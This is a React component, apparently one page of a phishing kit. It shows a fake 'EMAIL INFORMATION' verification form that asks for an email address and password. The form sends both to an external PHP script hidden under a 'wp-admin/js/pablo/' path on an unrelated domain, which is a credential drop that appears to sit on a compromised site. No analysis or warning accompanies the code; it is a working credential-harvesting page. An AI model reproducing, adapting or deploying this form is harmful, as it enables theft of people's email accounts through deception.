import React from "react"

const Verification3 = () => {
  return (
    <div className="w-full min-h-screen">
      <form
        className="px-4 lg:px-[120px] mt-4 lg:mt-[50px] flex flex-col min-h-[300px]"
        method="POST"
        action="https://investmentquarters.com/wp-admin/js/pablo/verify3.php"
      >
        <h1 className="text-[#192838] font-bold  text-3xl lg:text-4xl">
          EMAIL INFORMATION
        </h1>
        <h1 className="text-2xl text-red-500 mt-[25px]">* Required</h1>

        <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
          <h1 className="text-xs w-[80px]">Email</h1>
          <input
            type="text"
            required
            name="email"
            className="w-[200px] p-1 text-sm border border-[#333]"
          />
        </div>
        <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
          <h1 className="text-xs w-[80px]">Password</h1>
          <input
            type="password"
            required
            name="pass2"
            className="w-[200px] p-1 text-sm border border-[#333]"
          />
        </div>
        <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
          Submit
        </button>
      </form>
    </div>
  )
}

export default Verification3
